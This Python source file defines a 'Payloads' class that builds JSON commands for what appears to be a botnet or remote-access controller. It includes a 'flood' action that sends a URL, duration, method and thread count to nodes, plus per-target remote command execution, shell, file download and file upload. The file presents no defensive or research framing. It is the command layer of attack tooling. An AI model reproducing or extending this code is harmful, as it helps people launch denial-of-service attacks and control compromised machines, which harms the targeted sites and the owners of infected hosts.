import json
from pathlib import Path
from colorama import Fore, Style


class Payloads:
    @staticmethod
    def flood(url, duration, method, threads):
        return json.dumps(
            {
                "action": "flood",
                "data": {
                    "url": url,
                    "duration": duration,
                    "method": method,
                    "threads": threads,
                },
            }
        )

    @staticmethod
    def ping():
        return json.dumps({"action": "ping"})

    @staticmethod
    def sync_nodes():
        try:
            nodes_file = Path("data/nodes.json")
            if not nodes_file.exists():
                raise FileNotFoundError("nodes.json not found")
            with nodes_file.open("r") as f:
                nodes = json.load(f)
            data = [f"{node[0]}:{node[1]}" for node in nodes]
            return json.dumps({"action": "sync_nodes", "data": data})
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"{Fore.RED}Error: Failed to load nodes.json: {e}{Style.RESET_ALL}")
            return json.dumps({"action": "sync_nodes", "data": []})

    @staticmethod
    def status():
        return json.dumps({"action": "status"})

    @staticmethod
    def get_clients():
        return json.dumps({"action": "get_clients"})

    @staticmethod
    def disconnect_client(client_id):
        return json.dumps(
            {"action": "disconnect_client", "data": {"client_id": client_id}}
        )

    @staticmethod
    def exec_command(target, command):
        return json.dumps({
            "action": "exec",
            "target": target,
            "expect_response": True,
            "data": {"command": command},
        })

    @staticmethod
    def download(target, path):
        return json.dumps({
            "action": "download",
            "target": target,
            "expect_response": True,
            "data": {"path": path},
        })

    @staticmethod
    def upload(target, path, content_b64):
        return json.dumps({
            "action": "upload",
            "target": target,
            "expect_response": True,
            "data": {"path": path, "content_b64": content_b64},
        })

    @staticmethod
    def shell(target, command):
        return json.dumps({
            "action": "shell",
            "target": target,
            "expect_response": True,
            "data": {"command": command},
        })
